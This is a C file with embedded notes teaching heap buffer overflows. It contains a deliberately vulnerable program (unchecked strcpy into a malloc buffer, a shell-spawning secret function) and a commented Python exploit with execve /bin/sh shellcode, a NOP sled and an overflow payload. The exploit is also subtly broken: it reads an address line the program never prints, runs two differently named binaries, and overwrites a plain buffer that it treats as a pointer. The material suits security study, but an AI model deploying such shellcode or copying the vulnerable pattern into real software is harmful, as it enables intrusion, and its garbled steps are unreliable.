/*
Buffer overflows can happen in other memory segments, like heap and bss. 
If an important varibale is located after a buffer vulnerable to overflow,
the program's control flow can be altered. 

CONCEPT: (Heap-based Buffer Overflow Exploit)
    Unlike stack overflows, heap overflows happen when you overwrite memory inside 
    the heap (memory dynamically allocated with malloc() or similar).

    -> If a program allocates two buffers on the heap (e.g. via malloc), and you overflow one, 
       you might overwrite metadata, pointers, or function hooks associated with the next object.


STEPS:
	1.	Put shellcode in memory, usually in an environment variable or in the input.
	2.	Craft a payload that:
	     •	Overflows the first heap chunk
	     •	Overwrites a function pointer (or return address) with the address of your shellcode
	3.	Trigger the function or free() that uses the corrupted data.
*/

// 	Buffer 'a' can overflow and overwrite b’s metadata or pointer
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

void secret() {
    system("/bin/sh");
}

int main(int argc, char *argv[]) {
    char *a = malloc(64);
    char *b = malloc(64);

    strcpy(a, argv[1]); //  No bounds check → can overwrite b

    printf("b = %s\n", b);
    free(a);
    free(b);
    return 0;
}

/*
Full Python Exploit Example!
Let’s simulate a heap overflow that:
	•	Puts shellcode in an env variable
	•	Overwrites a heap pointer with the shellcode address
	•	Triggers a jump

// START OF PYTHON SCRIPT:
import os
import subprocess

# --- STEP 1: Shellcode to spawn /bin/sh ---
shellcode = (
    b"\x31\xc0"             # xor    eax,eax
    b"\x50"                 # push   eax
    b"\x68//sh"             # push   "//sh"
    b"\x68/bin"             # push   "/bin"
    b"\x89\xe3"             # mov    ebx,esp
    b"\x50"                 # push   eax
    b"\x53"                 # push   ebx
    b"\x89\xe1"             # mov    ecx,esp
    b"\x99"                 # cdq
    b"\xb0\x0b"             # mov    al,0xb
    b"\xcd\x80"             # int    0x80
)

# NOP sled + shellcode
env_payload = b"\x90" * 100 + shellcode
os.environ["SC"] = env_payload.decode("latin1")

# --- STEP 2: Get shellcode address ---
# Run the program once to print the env variable address
run = subprocess.run(["./c_file", "TEST"], env=os.environ, capture_output=True)
for line in run.stdout.decode().splitlines():
    if "SC at:" in line:
        sc_addr = int(line.split(":")[1].strip(), 16)
        print(f"[+] Shellcode address: {hex(sc_addr)}")
        break
else:
    print("[-] Couldn't find shellcode address")
    exit(1)

# --- STEP 3: Build payload ---
# Overflow buffer 'a' (64 bytes) + overwrite part of chunk b's metadata or fake pointer
padding = b"A" * 64
overwrite = sc_addr.to_bytes(4, "little")  # overwrite with shellcode address
payload = padding + overwrite

# --- STEP 4: Launch exploit ---
print("[*] Launching exploit with heap overflow...")
os.execve("./heap_bof", ["./heap_bof", payload.decode("latin1")], os.environ)

// end of script
*/

